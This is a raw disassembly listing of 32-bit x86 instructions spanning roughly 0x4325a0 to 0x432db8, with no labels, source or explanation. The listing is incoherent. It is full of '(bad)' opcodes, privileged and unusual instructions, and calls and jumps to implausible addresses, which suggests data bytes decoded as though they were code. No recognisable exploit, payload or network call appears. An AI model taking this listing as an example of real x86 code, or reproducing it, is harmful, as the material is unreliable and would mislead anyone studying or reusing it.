  4325a0:	mov    bx,WORD PTR [ebp-0x10]
  4325a4:	pop    bp
  4325a6:	fbstp  TBYTE PTR [ebx]
  4325a8:	test   DWORD PTR [ebx],eax
  4325aa:	add    BYTE PTR [ebx],bh
  4325ac:	add    BYTE PTR [esi+0x7d],ah
  4325af:	jge    0x43253c
  4325b1:	data16 in al,dx
  4325b3:	pop    ebp
  4325b4:	stc    
  4325b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325bc:	mov    edi,ebx
  4325be:	in     al,dx
  4325bf:	test   BYTE PTR [ebp+0x0],bh
  4325c2:	mov    eax,DWORD PTR [eax]
  4325c4:	call   0xbd401f54
  4325c9:	cmp    al,0x9b
  4325cb:	add    BYTE PTR [edx],dh
  4325cd:	mov    bx,di
  4325d0:	call   0x8b4ba360
  4325d5:	add    ebp,esp
  4325d7:	mov    bx,di
  4325da:	jnp    0x432602
  4325dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325e2:	mov    eax,DWORD PTR [eax]
  4325e4:	call   0x7c3eb14f
  4325e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4325fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432604:	(bad)  
  432605:	cld    
  432606:	jne    0x432644
  432608:	xor    eax,DWORD PTR [eax]
  43260a:	mov    esp,DWORD PTR [esi-0x10]
  43260d:	sti    
  43260e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432615:	data16 adc bl,bh
  432618:	push   ebp
  432619:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432620:	mov    WORD PTR [eax],es
  432622:	fwait
  432623:	data16 xor bh,bl
  432626:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43262c:	mov    esp,DWORD PTR [esi-0x14]
  43262f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432635:	or     al,0x2b
  432637:	mov    bh,0xba
  432639:	hlt    
  43263a:	mov    bh,bl
  43263c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432642:	dec    esi
  432643:	or     al,0x0
  432645:	mov    edi,DWORD PTR [ebx]
  432647:	or     BYTE PTR [ebp+0x3b],dh
  43264a:	mov    ecx,DWORD PTR [edi]
  43264c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432652:	xor    al,0xd8
  432654:	pop    bp
  432656:	lock xor esi,DWORD PTR [ebx]
  432659:	lea    esp,[esi+0x1f]
  43265c:	icebp  
  43265d:	jb     0x432663
  43265f:	add    al,al
  432661:	jge    0x43266f
  432663:	mov    eax,eax
  432665:	fsubr  st,st(3)
  432667:	pop    ebp
  432668:	mov    esi,DWORD PTR [ebx]
  43266a:	in     al,0x8d
  43266c:	rcr    DWORD PTR [edi],0xc2
  43266f:	jb     0x4326cf
  432671:	add    cl,cl
  432673:	jge    0x432681
  432675:	mov    edx,DWORD PTR [ebp-0x20]
  432678:	in     al,dx
  432679:	pop    ebp
  43267a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43267f:	cmp    di,WORD PTR [ebp+0x0]
  432683:	mov    ebp,DWORD PTR [ebx]
  432685:	fdivr  QWORD PTR [esi+0x668a5d]
  43268b:	cmp    al,0x33
  43268d:	mov    si,0x4e7d
  432691:	mov    eax,DWORD PTR [eax]
  432693:	lock inc ebp
  432695:	mov    esi,DWORD PTR [eax]
  432697:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43269e:	clc    
  43269f:	(bad)  
  4326a0:	cmp    edi,DWORD PTR [ebx]
  4326a2:	je     0x4326b3
  4326a4:	push   ebx
  4326a5:	loopne 0x4326b6
  4326a7:	dec    ecx
  4326a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4326ac:	int    0xf1
  4326ae:	mov    esi,0x703084d
  4326b3:	pcmpgtd mm6,mm1
  4326b6:	add    BYTE PTR [ebp+0x66],dh
  4326b9:	jmp    0x432686
  4326bb:	mov    eax,DWORD PTR [ebx]
  4326bd:	lock push ebp
  4326bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326c5:	or     bh,dl
  4326c7:	jb     0x4326c7
  4326c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326cf:	loopne 0x4326d1
  4326d1:	jne    0x4326d5
  4326d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4326d7:	mov    ecx,ebx
  4326d9:	data16 cmp al,0xf1
  4326dc:	add    BYTE PTR [esi+eiz*2],bh
  4326df:	add    bl,cl
  4326e1:	retw   0xf2
  4326e5:	ret    0x66
  4326e8:	retf   
  4326e9:	enterw 0x4df1,0x19
  4326ee:	pop    edi
  4326ef:	jne    0x432672
  4326f1:	mov    esi,DWORD PTR [eax]
  4326f3:	call   0x77b7b294
  4326f8:	xor    ebp,DWORD PTR [ebx]
  4326fa:	lea    esp,[esi+0x48]
  4326fd:	repnz in eax,0x3b
  432700:	add    BYTE PTR [ebp-0x37],dh
  432703:	xor    edx,DWORD PTR [ebp-0x15]
  432706:	in     al,dx
  432707:	xor    edx,DWORD PTR [esi+0x40]
  43270a:	mov    DWORD PTR [edi],0x338545fc
  432710:	clc    
  432711:	add    esi,DWORD PTR [ecx]
  432713:	pop    edi
  432714:	pushf  
  432715:	pop    ebx
  432716:	call   0xff4426dd
  43271b:	mov    edi,eax
  43271d:	push   ecx
  43271e:	pop    es
  43271f:	mov    edi,DWORD PTR [eax]
  432721:	push   esi
  432722:	inc    esi
  432723:	add    bh,BYTE PTR [esi+0x0]
  432726:	popa   
  432727:	data16 (bad) 
  432729:	into   
  43272a:	gs cmp al,0xcd
  43272d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432733:	ret    0x66
  432736:	add    bh,al
  432738:	add    bh,ah
  43273a:	add    BYTE PTR [ebp+0x31c3f866],al
  432740:	cmp    al,0x9c
  432742:	add    BYTE PTR [esi+0x66],ah
  432745:	into   
  432746:	ret    
  432747:	pop    ebp
  432748:	adc    BYTE PTR [edi+0x0],dl
  43274b:	mov    bh,0x66
  43274d:	mov    edi,0xff038dc3
  432752:	jne    0x4327a8
  432754:	lea    edx,[ecx+0x1]
  432757:	mov    ebx,0xd64ff1
  43275c:	sar    DWORD PTR [ebx],1
  43275e:	test   BYTE PTR [ebp+0x36],dh
  432761:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432765:	push   edi
  432766:	xor    BYTE PTR [ebx],0x38
  432769:	mov    esi,ebx
  43276b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432771:	ss inc ebp
  432773:	fs pop ebx
  432775:	mov    ebx,0x9c3b30
  43277a:	je     0x4327a7
  43277c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432782:	mov    WORD PTR [ebx],?
  432784:	ss mov ebx,0x8b4e64
  43278a:	pop    edi
  43278b:	cmp    ecx,ecx
  43278d:	jne    0x4327e4
  43278f:	mov    ebp,esp
  432791:	cld    
  432792:	push   esi
  432793:	pop    ebx
  432794:	inc    ebp
  432795:	stc    
  432796:	xor    BYTE PTR [ebp+0x9bef89c],al
  43279c:	test   esi,ecx
  43279e:	clc    
  43279f:	test   dl,dl
  4327a1:	cmp    bh,bh
  4327a3:	fs pop si
  4327a6:	or     bl,al
  4327a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4327ae:	retf   0x3c45
  4327b1:	xor    BYTE PTR [eax],al
  4327b3:	pushf  
  4327b4:	mov    si,0x85ca
  4327b8:	ret    0xf8
  4327bb:	pop    ebx
  4327bc:	dec    dx
  4327bf:	mov    edx,DWORD PTR [edi-0x76]
  4327c2:	push   edi
  4327c3:	add    al,0xb7
  4327c5:	xor    al,0xba
  4327c7:	cmp    al,0x8d
  4327c9:	je     0x4327ca
  4327cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327cf:	lea    edi,[ebx+0x544fff]
  4327d5:	push   ecx
  4327d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4327d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327df:	add    BYTE PTR [ebx],dh
  4327e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4327ee:	mov    ebx,0x3b3b00
  4327f3:	jne    0x432820
  4327f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4327fb:	xor    esi,DWORD PTR [ebx]
  4327fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432803:	push   edi
  432804:	cmp    esp,ebp
  432806:	jne    0x432808
  432808:	sbb    DWORD PTR [eax],0x8085c3fc
  43280e:	clc    
  43280f:	inc    esi
  432810:	pop    ebx
  432811:	sti    
  432812:	add    eax,0xeb8bc075
  432817:	cld    
  432818:	xor    edi,DWORD PTR ds:0xf8c3855e
  43281e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432821:	rol    DWORD PTR [ebp-0x37],0xf
  432825:	mov    DWORD PTR [eax],ecx
  432827:	inc    edi
  432828:	(bad)  
  432829:	in     eax,0xfe
  43282b:	add    bh,bh
  43282d:	(bad)  
  43282e:	mov    esi,0xc38a5e
  432833:	mov    esi,DWORD PTR [ebx]
  432835:	push   ecx
  432836:	mov    edi,0xfc4ec7
  43283b:	test   DWORD PTR [ebp-0x8],edx
  43283e:	xor    di,ax
  432841:	pushf  
  432842:	sub    ebp,eax
  432844:	inc    ebp
  432845:	(bad)  
  432846:	sub    edi,edi
  432848:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43284e:	inc    ebp
  43284f:	add    BYTE PTR [esi+0x2b],ah
  432852:	or     bh,BYTE PTR [edx+0xf8ac2]
  432858:	cmp    al,0x33
  43285a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432860:	(bad)  
  432861:	cmp    esi,DWORD PTR [ebx]
  432863:	je     0x43281d
  432865:	push   ebx
  432866:	dec    esi
  432867:	str    ecx
  43286a:	cmp    esp,DWORD PTR [ebp+0x75]
  43286d:	int    0x33
  43286f:	mov    edi,0x789085f
  432874:	mov    edx,DWORD PTR [eax]
  432876:	cld    
  432877:	add    cl,cl
  432879:	data16 add al,0xcb
  43287c:	push   ebp
  43287d:	add    ebp,esp
  43287f:	jne    0x43286d
  432881:	(bad)  
  432882:	mov    DWORD PTR [ecx],0xd685f7ec
  432888:	clc    
  432889:	xlat   BYTE PTR ds:[ebx]
  43288a:	inc    ebp
  43288b:	mov    esi,DWORD PTR [edx]
  43288d:	push   eax
  43288e:	pushf  
  43288f:	in     eax,0x8b
  432891:	add    ah,ch
  432893:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432897:	add    ax,0x72cb
  43289b:	cmp    al,0x0
  43289d:	add    BYTE PTR [ebp+0x66],al
  4328a0:	(bad)  
  4328a1:	retf   
  4328a2:	lock ret 0x85
  4328a6:	clc    
  4328a7:	inc    bp
  4328a9:	retf   
  4328aa:	cmp    eax,0xc77d9cc8
  4328af:	xor    ah,bh
  4328b1:	pushf  
  4328b2:	test   DWORD PTR [edi-0x8],ebx
  4328b5:	je     0x4328fc
  4328b7:	xor    esi,DWORD PTR ds:0x7020840
  4328bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4328c1:	push   ebp
  4328c2:	add    esp,ebp
  4328c4:	jb     0x432851
  4328c6:	add    BYTE PTR [eax],cl
  4328c8:	dec    ebp
  4328c9:	mov    bh,0x81
  4328cb:	push   esi
  4328cc:	push   esp
  4328cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328d4:	xor    al,BYTE PTR [eax]
  4328d6:	mov    edx,DWORD PTR [edi+0x10]
  4328d9:	(bad)  
  4328da:	scas   eax,DWORD PTR es:[edi]
  4328db:	ret    0x3b
  4328de:	jns    0x3b4425d1
  4328e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328e8:	dec    ebp
  4328e9:	or     BYTE PTR [ebx],ch
  4328eb:	ret    0x458b
  4328ee:	lock jmp 0x4328e2
  4328f1:	mov    ecx,DWORD PTR [eax]
  4328f3:	or     BYTE PTR [edi],al
  4328f5:	mov    ecx,eax
  4328f7:	xor    DWORD PTR [edx+0x2],0x0
  4328fb:	mov    bh,0xc1
  4328fd:	adc    BYTE PTR [eax],dh
  4328ff:	iret   
  432900:	inc    ebp
  432901:	mov    DWORD PTR [ebx],0x4dfff8c4
  432907:	inc    BYTE PTR [ebx]
  432909:	ret    0xf8
  43290c:	adc    DWORD PTR [esi+0x10],esp
  43290f:	clc    
  432910:	dec    ecx
  432911:	fisttp WORD PTR [ecx+0x456604c0]
  432917:	add    dh,BYTE PTR ds:0x75e0845
  43291d:	ret    0x4d
  432920:	lea    ecx,[ebx+0x18728301]
  432926:	add    BYTE PTR [ebp+0x45],al
  432929:	xor    ecx,ebp
  43292b:	pushf  
  43292c:	add    bh,al
  43292e:	add    al,ch
  432930:	inc    ebp
  432931:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432937:	xor    eax,0x781084d
  43293c:	push   esp
  43293d:	fwait
  43293e:	push   ecx
  43293f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432945:	inc    ebp
  432946:	cmp    edi,DWORD PTR [ecx]
  432948:	jbe    0x4328e6
  43294a:	mov    eax,edi
  43294c:	or     ah,dh
  43294e:	inc    ebp
  43294f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432955:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43295b:	in     al,dx
  43295c:	hlt    
  43295d:	push   esp
  43295e:	push   esp
  43295f:	push   ecx
  432960:	push   ecx
  432961:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432967:	fwait
  432968:	fwait
  432969:	xor    dh,BYTE PTR [edx]
  43296b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432971:	or     BYTE PTR [ebp+0x7],al
  432974:	mov    eax,ecx
  432976:	clc    
  432977:	jb     0x43293a
  432979:	add    BYTE PTR [ebp+0x55],cl
  43297c:	or     DWORD PTR [edi],0xc251d154
  432982:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43298c:	mov    edi,eax
  43298e:	or     cl,al
  432990:	inc    ebp
  432991:	dec    ebp
  432992:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432998:	or     WORD PTR [ecx],0x899b
  43299d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329a3:	mov    edx,DWORD PTR [ecx+0x8]
  4329a6:	mov    eax,DWORD PTR [ebp-0x8]
  4329a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329b6:	inc    ebp
  4329b7:	dec    eax
  4329b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329be:	add    edx,DWORD PTR [ecx-0x8]
  4329c1:	mov    ecx,DWORD PTR [ecx]
  4329c3:	clc    
  4329c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329cb:	mov    ecx,ebp
  4329cd:	clc    
  4329ce:	(bad)  
  4329cf:	popf   
  4329d0:	inc    DWORD PTR [eax]
  4329d2:	ret    0x8b
  4329d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329db:	mov    edi,esp
  4329dd:	hlt    
  4329de:	test   ecx,esi
  4329e0:	clc    
  4329e1:	or     BYTE PTR [ebp+0x7],al
  4329e4:	xor    al,cl
  4329e6:	pushf  
  4329e7:	jb     0x432a1c
  4329e9:	add    BYTE PTR [eax-0x3f],al
  4329ec:	inc    eax
  4329ed:	daa    
  4329ee:	inc    ebp
  4329ef:	inc    ebp
  4329f0:	xor    eax,0x7f80803
  4329f5:	dec    ebp
  4329f6:	fwait
  4329f7:	add    esi,DWORD PTR [edx]
  4329f9:	clc    
  4329fa:	cmp    DWORD PTR [ecx],ecx
  4329fc:	or     al,0x8
  4329fe:	add    al,BYTE PTR [ebp+0x2c]
  432a01:	xor    eax,0x7350845
  432a06:	or     BYTE PTR [ebp+0x7],cl
  432a09:	lea    ebx,[ebx-0x748dcdff]
  432a0f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a16:	mov    edx,DWORD PTR [eax]
  432a18:	cld    
  432a19:	dec    ebp
  432a1a:	push   esp
  432a1b:	sub    edx,DWORD PTR [ecx-0x75]
  432a1e:	add    eax,0xf172fc
  432a23:	or     BYTE PTR [ebp+0x7],cl
  432a26:	add    eax,ecx
  432a28:	or     al,0x72
  432a2a:	add    DWORD PTR [eax],eax
  432a2c:	mov    ebx,0x29c2c1
  432a31:	inc    ebp
  432a32:	mov    eax,DWORD PTR [ebx]
  432a34:	cmp    eax,0x3004d1c
  432a3a:	xbegin 0x66c8b634
  432a40:	clc    
  432a41:	or     BYTE PTR [ebp+0x45],al
  432a44:	xor    dh,BYTE PTR ds:0x78b089c
  432a4a:	adc    BYTE PTR [ebp+0x45],cl
  432a4d:	lea    eax,[ebp+0x33727501]
  432a53:	add    cl,ch
  432a55:	inc    ebp
  432a56:	add    bl,ch
  432a58:	add    BYTE PTR [ebx+0x45850845],cl
  432a5e:	je     0x4329eb
  432a60:	push   ebx
  432a61:	or     al,0x85
  432a63:	dec    ebp
  432a64:	std    
  432a65:	mov    bh,bh
  432a67:	mov    BYTE PTR [ebp-0x75],al
  432a6a:	mov    edi,eax
  432a6c:	or     al,0x89
  432a6e:	inc    ebp
  432a6f:	clc    
  432a70:	mov    esp,esp
  432a72:	hlt    
  432a73:	call   DWORD PTR [edi-0x37]
  432a76:	push   esp
  432a77:	or     al,0x51
  432a79:	push   ebp
  432a7a:	xor    ebp,esp
  432a7c:	mov    esi,0x457251
  432a81:	xor    esi,eax
  432a83:	pushf  
  432a84:	inc    ebp
  432a85:	(bad)  
  432a86:	mov    edi,eax
  432a88:	or     al,0x85
  432a8a:	add    al,bh
  432a8c:	inc    eax
  432a8e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a92:	or     ah,bh
  432a94:	inc    eax
  432a95:	push   esp
  432a96:	jmp    0x432ae9
  432a98:	mov    eax,DWORD PTR ds:0xe8720c
  432a9e:	mov    DWORD PTR [ebp-0x8],eax
  432aa1:	jne    0x432ae8
  432aa3:	jmp    0x432a30
  432aa5:	mov    ebp,DWORD PTR [eax]
  432aa7:	clc    
  432aa8:	retf   0xff54
  432aab:	push   ecx
  432aac:	mov    DWORD PTR ds:0x757210,eax
  432ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  432ab5:	sub    esp,DWORD PTR [ebx-0x77]
  432ab8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432abf:	or     ah,bh
  432ac1:	pop    es
  432ac2:	ds fwait
  432ac4:	push   DWORD PTR [edx]
  432ac6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432acc:	(bad)  
  432acd:	mov    bh,bh
  432acf:	jmp    0x432abd
  432ad1:	leave  
  432ad2:	jne    0x432adc
  432ad4:	call   0x30242e
  432ad9:	in     al,dx
  432ada:	dec    ebp
  432adb:	add    dh,BYTE PTR [ebx]
  432add:	add    BYTE PTR [ebx],al
  432adf:	inc    ebp
  432ae0:	cmp    esi,DWORD PTR [ecx]
  432ae2:	je     0x432a80
  432ae4:	mov    eax,edi
  432ae6:	or     al,0xf0
  432ae8:	add    BYTE PTR [ebp+0x458bf845],al
  432aee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432af4:	adc    al,0x7
  432af6:	enter  0x9fc0,0xa5
  432afa:	rol    BYTE PTR [eax],0x5e
  432afd:	mov    ecx,ecx
  432aff:	or     al,0xc
  432b01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b08:	jmp    0x432b09
  432b0a:	push   ebp
  432b0b:	mov    esp,ebp
  432b0d:	cld    
  432b0e:	inc    ebp
  432b0f:	inc    ebp
  432b10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b17:	push   esi
  432b18:	push   esi
  432b19:	mov    edi,0x7af080f
  432b1e:	add    bh,al
  432b20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b26:	add    BYTE PTR [ecx+0x4540100f],cl
  432b2c:	mov    ebp,eax
  432b2e:	mov    ebp,edi
  432b30:	lock call edx
  432b33:	fcom   DWORD PTR [ebp+0x45]
  432b36:	mov    eax,0x148a8b
  432b3b:	push   ecx
  432b3c:	enter  0xc145,0x83
  432b40:	cmp    ecx,DWORD PTR [eax]
  432b42:	add    BYTE PTR [ebp+0x4d],al
  432b45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b4b:	call   0xffa326ba
  432b50:	cmp    eax,DWORD PTR [ebp-0xc]
  432b53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b57:	push   ebp
  432b58:	(bad)  
  432b59:	call   0x34295d
  432b5e:	mov    bh,0xdb
  432b60:	cld    
  432b61:	or     BYTE PTR [ebp+0x45],bl
  432b64:	(bad)  
  432b65:	call   0xff7d27f5
  432b6a:	add    al,BYTE PTR [ebp+0x37]
  432b6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b73:	jne    0x432b75
  432b75:	(bad)  
  432b76:	cmp    edi,esp
  432b78:	jne    0x432bab
  432b7a:	mov    edi,edi
  432b7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b82:	pop    ds
  432b83:	into   
  432b84:	je     0x432b47
  432b86:	mov    ebx,DWORD PTR [esi]
  432b88:	or     BYTE PTR [ebp-0x49],al
  432b8b:	mov    esp,DWORD PTR [esi-0x77]
  432b8e:	mov    esi,0x2451f0c
  432b93:	mov    eax,DWORD PTR [eax]
  432b95:	or     al,0x66
  432b97:	sar    bl,0x3b
  432b9a:	xor    esi,DWORD PTR [ebp+0x66]
  432b9d:	xor    ecx,edi
  432b9f:	pop    edi
  432ba0:	adc    bl,BYTE PTR [ebx+0x7e]
  432ba3:	ret    0xff
  432ba6:	cld    
  432ba7:	inc    ebp
  432ba8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bae:	cld    
  432baf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bb6:	push   0xffffff83
  432bb8:	pop    edi
  432bb9:	or     BYTE PTR [ebp+0x53],dh
  432bbc:	xorps  xmm1,xmm2
  432bbf:	test   BYTE PTR [eax+eax*1],bh
  432bc2:	add    BYTE PTR [eax],al
  432bc4:	adc    eax,eax
  432bc6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432bce:	jmp    DWORD PTR [eax]
  432bd0:	ror    al,0x5e
  432bd3:	inc    ebp
  432bd4:	leave  
  432bd5:	xor    ecx,DWORD PTR [eax]
  432bd7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bdd:	add    ah,al
  432bdf:	xor    edi,edi
  432be1:	xor    DWORD PTR [ebx],0x66003302
  432be7:	mov    DWORD PTR [ebp-0xc],ecx
  432bea:	pcmpgtw mm0,mm0
  432bed:	add    dl,ah
  432bef:	leave  
  432bf0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432bf4:	push   eax
  432bf5:	dec    ebp
  432bf6:	mov    esi,DWORD PTR [ebx-0x75]
  432bf9:	lea    ebp,[eax-0x7c00ff02]
  432bff:	xor    eax,DWORD PTR [eax]
  432c01:	sysret 
  432c03:	dec    ebp
  432c04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c0b:	push   WORD PTR [ecx+0x8]
  432c0f:	jne    0x432bd2
  432c11:	ud0    ecx,DWORD PTR [ecx]
  432c14:	mov    eax,edx
  432c16:	lods   al,BYTE PTR ds:[esi]
  432c17:	add    BYTE PTR [eax],al
  432c19:	data16 (bad) 
  432c1b:	iret   
  432c1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c23:	cli    
  432c24:	inc    ebp
  432c25:	cmp    al,0x8d
  432c27:	add    BYTE PTR [esi+0x2d],ah
  432c2a:	inc    ebp
  432c2b:	pop    ebp
  432c2c:	lea    ecx,[edi]
  432c2e:	mov    dl,bh
  432c30:	add    BYTE PTR [edi],cl
  432c32:	mov    DWORD PTR [eax+eax*8],edi
  432c35:	mov    ebx,0x3b87
  432c3a:	add    BYTE PTR [ebx],ch
  432c3c:	inc    ebp
  432c3d:	data16 (bad) 
  432c3f:	clc    
  432c40:	int3   
  432c41:	cmp    eax,DWORD PTR [eax]
  432c43:	je     0x432bce
  432c45:	push   0xffffffc8
  432c47:	pop    edi
  432c48:	xchg   DWORD PTR [ebp+0x0],eax
  432c4b:	data16 add BYTE PTR [ebp+0x45],cl
  432c4f:	lea    cx,[ebp+0x10]
  432c53:	jb     0x432c55
  432c55:	jmp    0x432be0
  432c57:	call   eax
  432c59:	clc    
  432c5a:	xchg   DWORD PTR [edi+0x1],edi
  432c5d:	mov    eax,DWORD PTR [eax]
  432c5f:	or     BYTE PTR [ebp-0x49],al
  432c62:	lea    eax,[eax+0x74003154]
  432c68:	push   edi
  432c69:	inc    edx
  432c6a:	jge    0x432c6b
  432c6c:	mov    DWORD PTR [edi],ecx
  432c6e:	fdiv   DWORD PTR [edi-0x6]
  432c71:	inc    DWORD PTR [eax]
  432c73:	xor    edx,DWORD PTR [eax+0x5f]
  432c76:	xchg   DWORD PTR [ebx+0x1],ebx
  432c79:	ret    0x0
  432c7c:	xor    BYTE PTR [ebp-0x51],cl
  432c7f:	cmp    edi,0xf0ff89fe
  432c85:	data16 ror al,0x84
  432c89:	rol    BYTE PTR [eax],0x3b
  432c8c:	add    al,dh
  432c8e:	dec    eax
  432c8f:	xchg   esp,eax
  432c90:	push   ebx
  432c91:	jmp    0x432c1e
  432c93:	push   ebp
  432c94:	add    esp,ebp
  432c96:	add    ebp,esp
  432c98:	mov    edx,DWORD PTR [edi+0x24]
  432c9b:	clc    
  432c9c:	dec    esi
  432c9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ca3:	cmp    BYTE PTR [ebx],al
  432ca5:	jne    0x432c30
  432ca7:	xor    esp,eax
  432ca9:	jmp    0x462e2c
  432cae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cb1:	jne    0x432ca7
  432cb3:	call   0xffcd2a0d
  432cb8:	clc    
  432cb9:	xchg   edi,eax
  432cba:	sti    
  432cbb:	add    DWORD PTR [ebx],eax
  432cbd:	add    BYTE PTR [ebp+0x47],bl
  432cc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cc6:	pop    ebp
  432cc7:	mov    DWORD PTR [esi-0x48],esi
  432cca:	jmp    0x432d13
  432ccc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432cd2:	(bad)  
  432cd4:	cmp    al,0x0
  432cd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432cd9:	lea    ebx,[ebp-0x56]
  432cdc:	jle    0x432cde
  432cde:	jae    0x432c69
  432ce0:	mov    eax,esp
  432ce2:	call   0xb900:0x8b005587
  432ce9:	inc    ebp
  432cea:	push   ebp
  432ceb:	lea    ecx,[ebp-0x27ff4f12]
  432cf1:	mov    eax,edi
  432cf3:	int3   
  432cf4:	push   ebp
  432cf5:	xchg   edi,eax
  432cf7:	add    esp,ebp
  432cf9:	add    BYTE PTR [eax],al
  432cfb:	inc    ebp
  432cfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432d02:	cld    
  432d03:	mov    DWORD PTR [edx],edi
  432d05:	aam    0x75
  432d07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d0d:	mov    DWORD PTR [ebx-0x50],edx
  432d10:	test   BYTE PTR [ebp-0x1],0xe8
  432d14:	mov    eax,DWORD PTR [eax]
  432d16:	hlt    
  432d17:	add    al,al
  432d19:	mov    eax,DWORD PTR ds:0x890045a8
  432d1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d25:	inc    DWORD PTR [eax*2+0xf75854d]
  432d2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d32:	call   0x72998a73
  432d37:	je     0x432d97
  432d39:	js     0x432d9a
  432d3b:	lock ret 0x7e
  432d3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d45:	mov    edi,edi
  432d47:	sbb    al,bl
  432d49:	clc    
  432d4a:	add    BYTE PTR [ebp-0x73],bh
  432d4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d53:	ror    BYTE PTR [eax],1
  432d55:	dec    ebp
  432d56:	xchg   ebp,eax
  432d57:	mov    edi,edi
  432d59:	in     al,0x8b
  432d5b:	jge    0x432ce6
  432d5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d63:	clc    
  432d64:	pop    esi
  432d65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d6b:	clc    
  432d6c:	add    al,0x6e
  432d6e:	mov    eax,DWORD PTR [ebx]
  432d70:	mov    BYTE PTR [ebp+0x0],dl
  432d73:	mov    edx,DWORD PTR [ebx-0x20]
  432d76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d7c:	add    eax,0x3b3b73
  432d81:	adc    al,0x89
  432d83:	pop    eax
  432d84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d88:	ret    0xf08
  432d8b:	cmp    al,0x2
  432d8d:	mov    edx,eax
  432d8f:	cld    
  432d90:	add    BYTE PTR [ebp+0x66],dl
  432d93:	add    eax,ebx
  432d95:	add    esp,eax
  432d97:	sub    eax,eax
  432d99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d9f:	add    BYTE PTR [eax],al
  432da1:	mov    DWORD PTR [ebx-0x24],ebx
  432da4:	push   edi
  432da5:	push   ebp
  432da6:	clc    
  432da7:	add    DWORD PTR [esi+0x1b0100],0x45
  432dae:	out    0xff,eax
  432db0:	add    edx,DWORD PTR [eax]
  432db2:	jmp    0x432d9c
  432db4:	cmp    ch,0x46
  432db7:	(bad)  
  432db8:	jmp    0x40c8b60a
